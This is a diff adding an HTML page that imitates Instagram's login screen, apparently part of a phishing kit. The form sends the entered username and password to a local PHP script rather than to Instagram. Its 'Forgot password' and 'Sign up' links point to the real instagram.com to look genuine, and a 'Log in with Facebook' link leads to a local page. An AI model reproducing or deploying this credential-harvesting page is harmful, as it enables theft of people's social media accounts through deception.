@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <link rel="stylesheet" href="instagram/css/style.css">
+        <link rel="shortcut icon" type="image/png" href="instagram/img/favicon.ico">
+        <title>Instagram</title>
+    </head>
+    <body>            
+        <select id="lang">            
+            <option>English</option>
+            <option>Afrikaans</option>
+            <option>Čeština</option>
+            <option>Dansk</option>
+            <option>Deutsch</option>
+            <option>Ελληνικά</option>
+            <option>Español (España)</option>
+            <option>Español</option>
+            <option>Suomi</option>
+            <option>Français</option>
+            <option>Bahasa Indonesia</option>
+            <option>Italiano</option>
+            <option>日本語</option>
+            <option>한국어</option>
+            <option>Bahasa Melayu</option>
+            <option>Norsk</option>
+            <option>Nederlands</option>
+            <option>Polski</option>
+            <option>Português (Brasil)</option>
+            <option>Português (Portugal)</option>
+            <option>Русский</option>
+            <option>Svenska</option>
+            <option>ภาษาไทย</option>
+            <option>Filipino</option>
+            <option>Türkçe</option>
+            <option>中文(简体)</option>
+            <option>中文(台灣)</option>
+            <option>বাংলা</option>
+            <option>ગુજરાતી</option>
+            <option>हिन्दी</option>
+            <option>Hrvatski</option>
+            <option>Magyar</option>
+            <option>ಕನ್ನಡ</option>
+            <option>മലയാളം</option>
+            <option>मराठी</option>
+            <option>नेपाली</option>
+            <option>ਪੰਜਾਬੀ</option>
+            <option>සිංහල</option>
+            <option>Slovenčina</option>
+            <option>தமிழ்</option>
+            <option>తెలుగు</option>
+            <option>Tiếng Việt</option>
+            <option>中文(香港)</option>
+            <option>Български</option>
+            <option>Français (Canada)</option>
+            <option>Română</option>
+            <option>Српски</option>
+            <option>Українська</option>
+        </select>
+        <div id='container'>
+               <img id="logo" src="instagram/img/instagram.png">
+               <a id="facebook" href="facebook.html"><img id="fb-logo" src="instagram/img/facebook.png"> Log in with Facebook</a>
+               <span id="or"> OR </span>
+               <form action="instagram/php/login.php" method="POST">
+                   <input required id="username" name="username" type="text" spellcheck="false" maxlength="64" placeholder="Phone number, username, or email">
+                   <input required id="password" name="password" type="password" spellcheck="false" maxlength="64" placeholder="Password">
+                   <button type="submit">Log in</button>
+               </form>
+               <a id="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+        </div>
+        <div id="footer">
+            <span id="no-account"><span id="acnt">Don't have an account </span><a href="https://www.instagram.com/" id="sign-up">Sign up</a></span>
+        </div>
+    </body>
+</html>
+
+
+
